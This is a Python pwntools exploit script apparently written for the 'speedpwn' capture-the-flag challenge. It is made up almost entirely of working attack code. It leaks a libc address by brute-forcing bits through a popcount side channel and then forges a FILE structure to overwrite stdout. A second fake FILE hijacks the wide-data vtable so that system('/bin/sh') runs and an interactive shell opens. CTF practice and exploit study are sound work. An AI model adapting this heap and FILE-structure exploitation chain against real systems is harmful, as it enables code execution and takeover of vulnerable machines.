#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
dir ./glibc-2.39
# b fight_bot
# b fread
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return process('ncat --ssl speedpwn.chals.sekai.team 1337'.split(), *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

def fight_bot(wanted=None):
    sla(b'> ', b'f')
    
    botplays = rl().decode()
    v = botplays.split(' ')[2].strip()[:-1]
    v = int(v)
    
    if wanted==0:
        tosnd = str(0).encode()
    elif wanted==1:
        tosnd = str(0xFFFFFFFFFFFFFFFF).encode()
    else:
        tosnd = b'a'
    
    sla(b'Player plays: ', tosnd)
    return v >> 32, v & 0xFFFFFFFF

def wb(b):
    info(f'wb: {b}')
    for by in b:
        for _ in range(8):
            fight_bot(by&1)
            by = by >> 1


def simulate(pld):
    sla(b'> ', b's')
    sla(b"number: ", pld.encode())
    ru(b'number: ')
    res = rl().decode()
    return 0 if 'Bot' in res else 1


info("calculating popcnt")
n = 1
for _ in range(64):
    res = simulate(f"- {n}")
    print(f'{n:#x} -> {res} ({n.bit_count()})')
    if res: break
    n <<= 1
    n |= 1

# we know that _IO_default_uflow+50 has this many bits set
popcnt_num = n.bit_count()
popcnt_num_cp = popcnt_num
info(f'popcnt_num = {popcnt_num}')

#         rdi: 0x75e577e955c2 (_IO_default_uflow+50) ◂— cmp eax, -1
leak = 0x5c2
recovered = 12
popcnt_num -= leak.bit_count()

# now we have to bruteforce bit by bit
for _ in range(48):
    info(f"{popcnt_num} {leak:#x}")
    
    # next bit set to zero
    prep = 0
    for k in range(popcnt_num):
        prep <<= 1
        prep |= 1
    
    prep <<= recovered+1
    prep |= leak
    
    res2 = simulate(f"- {prep}")
    assert prep.bit_count() == popcnt_num_cp
    
    if res2:
        # we set '0' and won, so '0' matched (because all bits further are '1')
        info("won")
        recovered += 1
    else:
        info("lost")
        # we set '0' and lost, set '1'
        leak = leak | (1<<recovered)
        recovered += 1
        popcnt_num -= 1


success(f"libc_leak = {prep:#x}")
libc.address = prep - 0x955c2
success(f"libc.address = {libc.address:#x}")
stdout = libc.sym['_IO_2_1_stdout_']


_IO_NO_READS    =      0x0004 # /* Reading not allowed.  */
_IO_CURRENTLY_PUTTING = 0x0800

fp = FileStructure(0)
fp.flags = 0xfbad2088
fp.flags &= ~_IO_NO_READS
fp.flags &= ~_IO_CURRENTLY_PUTTING

fp._IO_read_ptr = 0
fp._IO_read_base = 0
fp._IO_buf_base = stdout
fp._IO_buf_end = stdout+0x300
fp._lock = libc.sym['_IO_stdfile_0_lock']
fp.vtable = libc.sym['_IO_file_jumps']
fp.fileno = constants.STDIN_FILENO

wb(b'A' * 0x10)
wb(p64(0x4040a0))

info("crafting fake file struct")
wb(bytes(fp).strip(b'\x00'))
sla(b'> ', b'r')



stdout_lock = libc.sym['_IO_stdfile_1_lock']   # _IO_stdfile_1_lock  (symbol not exported)
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = libc.address + 0x001791c7 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
s(bytes(fake))

ia()
